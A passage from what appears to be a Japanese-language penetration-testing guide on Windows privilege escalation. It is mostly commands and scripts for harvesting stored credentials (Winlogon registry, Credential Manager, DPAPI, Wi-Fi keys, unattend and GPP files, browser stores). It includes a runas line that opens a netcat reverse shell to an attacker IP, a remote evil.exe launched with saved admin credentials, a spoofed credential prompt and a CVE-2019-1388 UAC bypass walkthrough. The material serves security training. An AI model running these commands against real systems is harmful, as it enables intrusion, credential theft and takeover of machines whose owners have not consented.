Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP テーブル
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### ファイアウォールのルール

[**ファイアウォールに関連するコマンドについては、このページをチェックしてください**](../basic-cmd-for-pentesters.md#firewall) **(ルールのリスト、ルールの作成、無効化、無効化...)**

ネットワーク列挙のための[その他のコマンドはこちら](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
バイナリの `bash.exe` は `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` にも見つけることができます。

root ユーザーになると、任意のポートでリッスンすることができます（ポートで `nc.exe` を初めて使用すると、ファイアウォールによって `nc` が許可されるかどうかを GUI で尋ねられます）。
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
```
rootユーザーとして簡単にbashを起動するには、`--default-user root`を試してみてください。

`C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`フォルダーで`WSL`ファイルシステムを探索できます。

## Windowsの資格情報

### Winlogonの資格情報
```
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### 資格情報マネージャー / Windows Vault

[https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vaultは、**Windows**が**ユーザーを自動的にログイン**させることができるサーバー、ウェブサイト、および他のプログラムのユーザー資格情報を格納します。最初のインスタンスでは、これはユーザーがFacebookの資格情報、Twitterの資格情報、Gmailの資格情報などを自動的にブラウザ経由でログインできるようにすることのように見えるかもしれませんが、実際にはそうではありません。

Windows Vaultは、Windowsがユーザーを自動的にログインさせるための資格情報を格納し、つまり、**リソース（サーバーまたはウェブサイト）にアクセスするために資格情報が必要なWindowsアプリケーションが、ユーザーがユーザー名とパスワードを毎回入力する代わりに提供された資格情報を使用できるようにする**ことができます。

アプリケーションが資格情報マネージャーとやり取りしない限り、特定のリソースの資格情報を使用することはできないと思います。したがって、アプリケーションがVaultを利用する場合、デフォルトのストレージVaultからそのリソースの資格情報を取得するために、資格情報マネージャーと何らかの方法で**通信する必要があります**。

`cmdkey`を使用して、マシンに保存されている資格情報をリストアップします。
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
次に、保存された資格情報を使用するために`runas`を`/savecred`オプションとともに使用できます。次の例は、SMB共有を介してリモートバイナリを呼び出しています。
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
`runas`を使用して提供された資格情報を使用します。
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
注意してください。mimikatz、lazagne、[credentialfileview](https://www.nirsoft.net/utils/credentials\_file\_view.html)、[VaultPasswordView](https://www.nirsoft.net/utils/vault\_password\_view.html)、または[Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/credentials/dumpCredStore.ps1)から情報を取得できます。

### DPAPI

**Data Protection API (DPAPI)** は、データの対称暗号化のための手法を提供し、主にWindowsオペレーティングシステム内で非対称プライベートキーの対称暗号化に使用されます。この暗号化は、ユーザーまたはシステムの秘密をエントロピーに大きく寄与させます。

**DPAPIは、ユーザーのログイン秘密から派生した対称鍵を使用してキーを暗号化することを可能にします**。システム暗号化を含むシナリオでは、システムのドメイン認証秘密を利用します。

DPAPIを使用して暗号化されたユーザーRSAキーは、`%APPDATA%\Microsoft\Protect\{SID}`ディレクトリに保存されます。ここで`{SID}`はユーザーの[セキュリティ識別子](https://en.wikipedia.org/wiki/Security\_Identifier)を表します。**DPAPIキーは、通常64バイトのランダムデータで構成され、ユーザーのプライベートキーを保護するマスターキーと同じファイルに格納されています**。（このディレクトリへのアクセスは制限されており、CMDの`dir`コマンドを使用してその内容をリスト表示することはできませんが、PowerShellを介してリスト表示することができます）。
```powershell
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
以下は、適切な引数（`/pvk`または`/rpc`）を使用して、**mimikatzモジュール** `dpapi::masterkey`を使用して復号化できます。

通常、**マスターパスワードで保護された資格情報ファイル**は次の場所にあります：
```powershell
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
**mimikatzモジュール** `dpapi::cred` を適切な `/masterkey` と共に使用して復号化することができます。\
`sekurlsa::dpapi` モジュールを使用して（root権限であれば）、**メモリ**から**多くのDPAPI** **マスターキー**を抽出できます。

{% content-ref url="dpapi-extracting-passwords.md" %}
[dpapi-extracting-passwords.md](dpapi-extracting-passwords.md)
{% endcontent-ref %}

### PowerShell資格情報

**PowerShell資格情報** は、しばしば**スクリプト**や自動化タスクで使用され、暗号化された資格情報を便利に保存する手段として使用されます。これらの資格情報は通常、**DPAPI** を使用して保護されており、通常は作成されたコンピューター上の同じユーザーによってのみ復号化できることを意味します。

ファイルに含まれるPS資格情報を復号化するには、以下の操作を行うことができます：
```powershell
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi

### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### 保存されたRDP接続

`HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`で見つけることができます。\
そして`HKCU\Software\Microsoft\Terminal Server Client\Servers\`内にもあります。

### 最近実行されたコマンド
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **リモートデスクトップ資格情報マネージャー**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
**Mimikatz**の`dpapi::rdg`モジュールを適切な`/masterkey`と共に使用して、**.rdgファイルを復号化**します。\
Mimikatzの`sekurlsa::dpapi`モジュールを使用して、メモリから**多くのDPAPIマスターキー**を抽出できます。

### Sticky Notes

人々はしばしばWindowsワークステーションでStickyNotesアプリを使用して、**パスワード**やその他の情報を保存しますが、これがデータベースファイルであることに気づいていません。このファイルは`C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`にあり、常に検索して調査する価値があります。

### AppCmd.exe

**AppCmd.exeからパスワードを回復するには、管理者である必要があり、高い整合性レベルで実行する必要があります。**\
**AppCmd.exe**は`%systemroot%\system32\inetsrv\`ディレクトリにあります。\
このファイルが存在する場合、いくつかの**資格情報**が構成されており、**回復**できる可能性があります。

このコードは[**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)から抽出されました。
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe` が存在するかどうかを確認します。\
インストーラーは **SYSTEM 権限で実行されます**。多くは **DLL Sideloading に脆弱** である（情報は [https://github.com/enjoiz/Privesc](https://github.com/enjoiz/Privesc) から取得）。
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## ファイルとレジストリ（資格情報）

### Puttyの資格情報
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH ホストキー
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### レジストリ内のSSHキー

SSHの秘密キーは、レジストリキー `HKCU\Software\OpenSSH\Agent\Keys` 内に保存される可能性があるため、そこに興味深い情報がないかをチェックする必要があります。
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
もしそのパス内にエントリが見つかった場合、おそらく保存されたSSHキーである可能性があります。それは暗号化されていますが、[https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) を使用して簡単に復号化できます。\
このテクニックに関する詳細はこちら：[https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

`ssh-agent` サービスが実行されていない場合、自動的に起動するようにしたい場合は、次のコマンドを実行します：
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
{% hint style="info" %}
このテクニックはもはや有効ではないようです。`ssh-add`を使用してsshキーを作成し、それらを追加し、ssh経由でマシンにログインしようとしました。レジストリ`HKCU\Software\OpenSSH\Agent\Keys`は存在せず、procmonは非対称キー認証中に`dpapi.dll`の使用を特定しませんでした。
{% endhint %}

### Unattended files
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
あなたは**metasploit**を使用してこれらのファイルを検索することもできます: _post/windows/gather/enum\_unattend_

例の内容:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM バックアップ
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### クラウド資格情報
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

**SiteList.xml**というファイルを検索します

### キャッシュされたGPPパスワード

以前利用可能だった機能により、Group Policy Preferences (GPP) を介して複数のマシンにカスタムローカル管理者アカウントを展開することができました。ただし、この方法には重大なセキュリティ上の欠陥がありました。まず第一に、SYSVOLにXMLファイルとして保存されているGroup Policy Objects (GPOs) には、どのドメインユーザーでもアクセスできました。第二に、これらのGPP内のパスワードは、公に文書化されたデフォルトキーを使用してAES256で暗号化されていましたが、認証されたユーザーであれば誰でも復号化できました。これはユーザーが昇格権を取得する可能性があるため、深刻なリスクをもたらしました。

このリスクを軽減するために、"cpassword" フィールドが空でないローカルにキャッシュされたGPPファイルをスキャンする機能が開発されました。そのようなファイルを見つけると、その機能はパスワードを復号化してカスタムPowerShellオブジェクトを返します。このオブジェクトには、GPPとファイルの場所に関する詳細が含まれており、このセキュリティ上の脆弱性の特定と修復を支援します。

これらのファイルを検索します：`C:\ProgramData\Microsoft\Group Policy\history` または _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (W Vista以前)_ 

* Groups.xml
* Services.xml
* Scheduledtasks.xml
* DataSources.xml
* Printers.xml
* Drives.xml

**cPasswordを復号化するには:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
`crackmapexec`を使用してパスワードを取得する方法:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config

### IIS ウェブ構成
```powershell
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```powershell
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```powershell
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Web.configの例と資格情報：
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPNの資格情報
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### ログ
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### 資格情報の要求

常にユーザーに**自分の資格情報を入力してもらうか、別のユーザーの資格情報を入力してもらうように要求**することができます（クライアントに**資格情報**を直接**要求**することは非常に**リスキー**であることに注意してください）:
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **資格情報を含む可能性のあるファイル名**

以前に**パスワード**を**クリアテキスト**または**Base64**で含んでいたと知られているファイル
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
すべての提案されたファイルを検索します:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### RecycleBin内の資格情報

Binをチェックして、中にある資格情報を探すべきです

複数のプログラムに保存された**パスワードを回復**するには、次を使用できます: [http://www.nirsoft.net/password\_recovery\_tools.html](http://www.nirsoft.net/password\_recovery\_tools.html)

### レジストリ内部

**資格情報を持つ可能性のある他のレジストリキー**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**レジストリからopensshキーを抽出します。**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### ブラウザの履歴

**ChromeまたはFirefox** からのパスワードが保存されているdbsをチェックする必要があります。\
また、ブラウザの履歴、ブックマーク、お気に入りをチェックして、そこに**パスワードが**保存されているかもしれません。

ブラウザからパスワードを抽出するためのツール:

* Mimikatz: `dpapi::chrome`
* [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
* [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
* [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLLの上書き**

**Component Object Model (COM)** は、Windowsオペレーティングシステム内に組み込まれた技術であり、異なる言語のソフトウェアコンポーネント間の**相互通信**を可能にします。各COMコンポーネントはクラスID（CLSID）によって識別され、各コンポーネントは1つ以上のインターフェースを介して機能を公開し、インターフェースID（IID）によって識別されます。

COMクラスとインターフェースは、レジストリ内の**HKEY\_**_**CLASSES\_**_**ROOT\CLSID**および**HKEY\_**_**CLASSES\_**_**ROOT\Interface**に定義されます。このレジストリは、**HKEY\_**_**LOCAL\_**_**MACHINE\Software\Classes** + **HKEY\_**_**CURRENT\_**_**USER\Software\Classes** = **HKEY\_**_**CLASSES\_**_**ROOT**をマージして作成されます。

このレジストリのCLSIDsの中には、**InProcServer32**という子レジストリがあり、**DLL**を指す**デフォルト値**と、**Apartment**（シングルスレッド）、**Free**（マルチスレッド）、**Both**（シングルまたはマルチ）、または**Neutral**（スレッドニュートラル）と呼ばれる値を含む**ThreadingModel**が含まれています。

基本的に、実行されるDLLのいずれかを**上書き**できれば、別のユーザーによって実行される場合には、特権を**昇格**できます。

攻撃者がCOMハイジャックを永続化メカニズムとしてどのように使用するかを学ぶには、以下を参照してください:

{% content-ref url="com-hijacking.md" %}
[com-hijacking.md](com-hijacking.md)
{% endcontent-ref %}

### **ファイルとレジストリ内の一般的なパスワード検索**

**ファイル内容の検索**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**特定のファイル名を持つファイルを検索する**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**レジストリを検索してキー名とパスワードを探す**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### パスワードを検索するツール

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **は私が作成したmsfプラグイン**で、被害者の中で資格情報を検索するすべてのmetasploit POSTモジュールを自動的に実行するように設計されています。\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) は、このページに記載されているパスワードを含むすべてのファイルを自動的に検索します。\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) はシステムからパスワードを抽出するための別の優れたツールです。

ツール[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) は、このデータを平文で保存する複数のツール（PuTTY、WinSCP、FileZilla、SuperPuTTY、およびRDP）の**セッション**、**ユーザー名**、**パスワード**を検索します。
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## リークしたハンドラ

**SYSTEMとして実行されているプロセスが、完全なアクセス権限で新しいプロセスを開く**（`OpenProcess()`）とします。同じプロセスが**低い特権で新しいプロセス**（`CreateProcess()`）**を作成し、ただしメインプロセスのすべてのオープンハンドルを継承します**。\
その後、**低い特権を持つプロセスに完全なアクセス権限がある場合**、`OpenProcess()`で作成された**特権プロセスへのオープンハンドルを取得し、シェルコードをインジェクト**できます。\
[この脆弱性を**検出および悪用する方法**について詳細を読むにはこちらを参照してください。](leaked-handle-exploitation.md)\
[異なる権限レベルで継承されたプロセスおよびスレッドのオープンハンドラをテストおよび悪用する方法についての**詳細な説明については、この他の投稿を読んでください**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## 名前付きパイプクライアントの権限昇格

**パイプ**として参照される共有メモリセグメントは、プロセス間の通信とデータ転送を可能にします。

Windowsには**Named Pipes**と呼ばれる機能があり、関連のないプロセスが異なるネットワークを介してデータを共有できます。これは、**名前付きパイプサーバ**と**名前付きパイプクライアント**として定義された役割を持つクライアント/サーバアーキテクチャに似ています。

**クライアント**がパイプを介してデータを送信すると、パイプを設定した**サーバ**は、必要な**SeImpersonate**権限を持っていれば、**クライアント**の**アイデンティティを引き継ぐ**能力を持ちます。確立したパイプを介してやり取りするプロセスのアイデンティティを模倣できる**特権プロセス**を特定することで、そのプロセスが設定したパイプとやり取りするときに、そのプロセスのアイデンティティを取得することで、**高い特権を獲得**する機会が提供されます。このような攻撃を実行する手順については、[こちら](named-pipe-client-impersonation.md)と[こちら](./#from-high-integrity-to-system)で役立つガイドが見つかります。

また、次のツールを使用すると、**burpなどのツールを使用して名前付きパイプ通信を傍受**できます：[**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **また、このツールを使用すると、すべてのパイプをリストおよび表示して特権昇格を見つけることができます**：[**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## その他

### **パスワードを監視するためのコマンドラインの監視**

ユーザーとしてシェルを取得すると、スケジュールされたタスクや他のプロセスが実行され、**コマンドラインで資格情報が渡される**場合があります。以下のスクリプトは、プロセスのコマンドラインを2秒ごとにキャプチャし、現在の状態と前の状態を比較して、違いがあれば出力します。
```powershell
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## プロセスからパスワードを盗む

## 低特権ユーザーからNT\AUTHORITY SYSTEMへ（CVE-2019-1388）/ UAC バイパス

グラフィカルインターフェースにアクセスできる場合（コンソールまたはRDP経由）かつUACが有効な場合、一部のMicrosoft Windowsバージョンでは、特権のないユーザーからターミナルや他のプロセス（例：「NT\AUTHORITY SYSTEM」）を実行することが可能です。

これにより、特権を昇格させ、同時にUACをバイパスすることができます。さらに、何もインストールする必要はなく、プロセス中に使用されるバイナリは、Microsoftによって署名されています。

影響を受けるシステムの一部は以下の通りです：
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
この脆弱性を悪用するには、以下の手順を実行する必要があります:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
You have all the necessary files and information in the following GitHub repository:

https://github.com/jas502n/CVE-2019-1388

## From Administrator Medium to High Integrity Level / UAC Bypass

Read this to **learn about Integrity Levels**:

{% content-ref url="integrity-levels.md" %}
[integrity-levels.md](integrity-levels.md)
{% endcontent-ref %}

Then **read this to learn about UAC and UAC bypasses:**

{% content-ref url="../authentication-credentials-uac-and-efs/uac-user-account-control.md" %}
